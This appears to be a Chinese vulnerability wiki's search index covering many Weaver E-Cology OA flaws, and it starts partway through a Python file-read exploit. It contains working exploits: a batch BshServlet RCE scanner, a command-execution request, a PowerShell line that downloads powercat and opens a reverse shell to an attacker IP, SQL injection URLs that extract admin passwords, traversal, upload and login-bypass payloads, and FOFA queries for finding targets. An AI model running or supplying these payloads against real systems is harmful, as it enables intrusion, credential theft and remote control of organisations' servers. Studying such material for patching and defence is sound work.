目标为 Windows 系统\\033[0m\") id = re.findall(r'\"id\":\"(.*?)\"', response_1.text)[0] print(\"\\033[32m[o] 成功获取id：{}\\033[0m\".format(id)) return id,\"windows\" else: print(\"\\033[31m[x] 无法获取目标系统\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # 验证漏洞 def POC_2(target_url, id): file_url = target_url + \"/file/fileNoLogin/{}\".format(id) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) response.encoding = 'GBK' print(\"\\033[32m[o] 成功读取：\\n\\033[0m{}\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # windows 文件读取 def POC_3(target_url, File): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test\u0026downloadUrl=file:///C:/{}\u0026fileExt=txt\".format(File) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) id = re.findall(r'\"id\":\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] 成功获取id：{}\\033[0m\".format(id)) POC_2(target_url, id) except : print(\"\\033[31m[x] 请求失败，无法读取文件 \\033[0m)\") # linux读取文件 def POC_4(target_url, File): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test\u0026downloadUrl=file://{}\u0026fileExt=txt\".format(File) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) id = re.findall(r'\"id\":\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] 成功获取id：{}\\033[0m\".format(id)) POC_2(target_url, id) except: print(\"\\033[31m[x] 请求失败，无法读取文件 \\033[0m)\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Att","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA E-Cology BshServlet 远程代码执行漏洞 CNVD-2019-32204 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-bshservlet-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2019-32204/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-bshservlet-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2019-32204/"},{"categories":null,"content":"漏洞描述 2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重. ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-bshservlet-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2019-32204/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-bshservlet-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2019-32204/"},{"categories":null,"content":"网络测绘 app=“泛微-协同办公OA” ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-bshservlet-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2019-32204/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-bshservlet-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2019-32204/"},{"categories":null,"content":"漏洞影响 E-cology 7.0 E-cology 8.0 E-cology 8.1 E-cology 9.0 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-bshservlet-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2019-32204/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-bshservlet-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2019-32204/"},{"categories":null,"content":"漏洞复现 直接在网站根目录后加入组件访问路径 /weaver/bsh.servlet.BshServlet/，如下图在victim上执行了命令“whoami” 请求包为 POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script=ex\\u0065c(\"cmd /c dir\");\u0026bsh.servlet.captureOutErr=true\u0026bsh.servlet.output=raw 关于绕过 eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\"); ex\\u0065c(\"cmd /c dir\"); IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-bshservlet-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2019-32204/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-bshservlet-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2019-32204/"},{"categories":null,"content":"漏洞POC https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204 #/usr/bin/python #coding:utf-8 #Author:Ja0k #For Weaver-Ecology-OA_RCE import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) import requests,sys headers = { 'Content-Type': 'text/xml; charset=utf-8', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0', 'Cache-Control': 'max-age=0', 'Content-Type': 'application/x-www-form-urlencoded', 'Upgrade-Insecure-Requests': '1', 'Content-Length': '578' } proxies= {'http':'http://127.0.0.1:8080'} def Poc_check(target): Url_Payload1=\"/bsh.servlet.BshServlet\" Url_Payload2=\"/weaver/bsh.servlet.BshServlet\" Url_Payload3=\"/weaveroa/bsh.servlet.BshServlet\" Url_Payload4=\"/oa/bsh.servlet.BshServlet\" Data_Payload1=\"\"\"bsh.script=exec(\"whoami\");\u0026bsh.servlet.output=raw\"\"\" Data_Payload2= \"\"\"bsh.script=\\u0065\\u0078\\u0065\\u0063(\"whoami\");\u0026bsh.servlet.captureOutErr=true\u0026bsh.servlet.output=raw\"\"\" Data_Payload3= \"\"\"bsh.script=eval%00(\"ex\"%2b\"ec(bsh.httpServletRequest.getParameter(\\\\\"command\\\\\"))\");\u0026bsh.servlet.captureOutErr=true\u0026bsh.servlet.output=raw\u0026command=whoami\"\"\" for Url_Payload in (Url_Payload1,Url_Payload2,Url_Payload3,Url_Payload4): url= target + Url_Payload for Data_payload in (Data_Payload1,Data_Payload2,Data_Payload3): try: http_response = requests.post(url,data=Data_payload,headers=headers,verify=False) #print http_response.status_code if http_response.status_code == 200: if \";\u003c/script\u003e\" not in (http_response.content): if \"Login.jsp\" not in (http_response.content): if \"Error\" not in (http_response.content): print \"{0} is a E-cologyOA_RCE Vulnerability\".format(url) print \"Server Current Username：{0}\".format(http_response.content) elif http_response.status_code == 500: print \"{0}500 maybe is Weaver-EcologyOA，Please confirm by yourself \".format(url) else: pass except Exception,Error: pass if __name__ == '__main__': for line in open(sys.argv[1]).readlines(): target=line.strip() Poc_check(target) #1.install python Dependencies Library pip install requests #2.批量脚本 执行 python Weaver-Ecology-OA_RCE-exp.py url.txt文件中 是url地址 需要带http协议 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-bshservlet-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2019-32204/:5:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-bshservlet-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2019-32204/"},{"categories":null,"content":"泛微OA E-Cology getSqlData SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-getsqldata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-getsqldata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等。 泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息。 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-getsqldata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-getsqldata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微e-cology 8.0 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-getsqldata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-getsqldata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"泛微-协同办公OA\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-getsqldata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-getsqldata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-getsqldata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-getsqldata-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-hrmcareerapplyperview.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-hrmcareerapplyperview.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微OA E-Cology HrmCareerApplyPerView.jsp 文件存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库敏感文件 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-hrmcareerapplyperview.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-hrmcareerapplyperview.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微OA E-Cology ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-hrmcareerapplyperview.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-hrmcareerapplyperview.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"泛微-协同办公OA\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-hrmcareerapplyperview.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-hrmcareerapplyperview.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-hrmcareerapplyperview.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-hrmcareerapplyperview.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-jqueryfiletree.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-jqueryfiletree.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等，其中 jqueryFileTree.jsp 文件中 dir 参数存在目录遍历漏洞，攻击者通过漏洞可以获取服务器文件目录信息 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-jqueryfiletree.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-jqueryfiletree.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微e-cology 9.0 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-jqueryfiletree.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-jqueryfiletree.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"泛微-协同办公OA\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-jqueryfiletree.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-jqueryfiletree.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../ ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-jqueryfiletree.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-jqueryfiletree.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA E-cology KtreeUploadAction 任意文件上传 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ktreeuploadaction-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ktreeuploadaction-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞描述 参考链接： 泛微e-cology任意文件上传(已修复) ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ktreeuploadaction-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ktreeuploadaction-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞影响 目前已修复 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ktreeuploadaction-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ktreeuploadaction-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞复现 定位文件： ecology\\CLASSB~1\\com\\weaver\\formmodel\\apps\\ktree\\servlet\\KtreeUploadAction.class exp： POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: multipart/form-data; boundary=--------1638451160 Content-Length: 171 ----------1638451160 Content-Disposition: form-data; name=\"test\"; filename=\"test.jsp\" Content-Type: image/jpeg helloword ----------1638451160-- ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ktreeuploadaction-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ktreeuploadaction-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"泛微OA E-Cology LoginSSO.jsp SQL注入漏洞 CNVD-2021-33202 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-loginsso.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-33202/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-loginsso.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-33202/"},{"categories":null,"content":"漏洞描述 泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等。 泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息。 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-loginsso.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-33202/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-loginsso.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-33202/"},{"categories":null,"content":"漏洞影响 泛微e-cology 8.0 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-loginsso.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-33202/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-loginsso.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-33202/"},{"categories":null,"content":"网络测绘 app=\"泛微-协同办公OA\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-loginsso.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-33202/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-loginsso.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-33202/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-loginsso.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-33202/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-loginsso.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-33202/"},{"categories":null,"content":"泛微OA E-Cology ofsLogin.jsp 前台任意用户登录漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ofslogin.jsp-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ofslogin.jsp-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微 e-cology 前台任意用户登录漏洞：泛微 e-cology9 部分版本中存在前台任意用户登录漏洞。该漏洞允许未经身份验证的攻击者通过发送构造的请求触发漏洞，成功利用此漏洞的攻击者可登录任意用户。 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ofslogin.jsp-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ofslogin.jsp-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 部分 e-cology9 且补丁版本 \u003c 10.57 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ofslogin.jsp-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ofslogin.jsp-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 poc1 /mobile/plugin/1/ofsLogin.jsp?syscode=syscode\u0026timestamp=2\u0026gopage=3\u0026receiver=test\u0026loginTokenFromThird= poc2 /mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html\u0026loginTokenFromThird=866fb3887a60239fc112354ee7ffc168\u0026receiver=1\u0026syscode=1\u0026timestamp ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ofslogin.jsp-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ofslogin.jsp-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞修复 目前，官方已发布修复建议，建议受影响的用户尽快升级至最新版本的补丁。下载地址：https://www.weaver.com.cn/cs/securityDownload.asp# ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ofslogin.jsp-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-ofslogin.jsp-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA E-Cology users.data 敏感信息泄漏 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-users.data-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-users.data-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/"},{"categories":null,"content":"漏洞描述 泛微OA E-Cology users.data 允许任意用户下载，获取OA中的敏感信息 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-users.data-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-users.data-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/"},{"categories":null,"content":"漏洞影响 泛微OA E-Cology ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-users.data-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-users.data-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/"},{"categories":null,"content":"网络测绘 app=\"泛微-协同商务系统\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-users.data-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-users.data-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /messager/users.data base64 GBK解码 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-cology-users.data-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-cology-users.data-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/"},{"categories":null,"content":"泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞 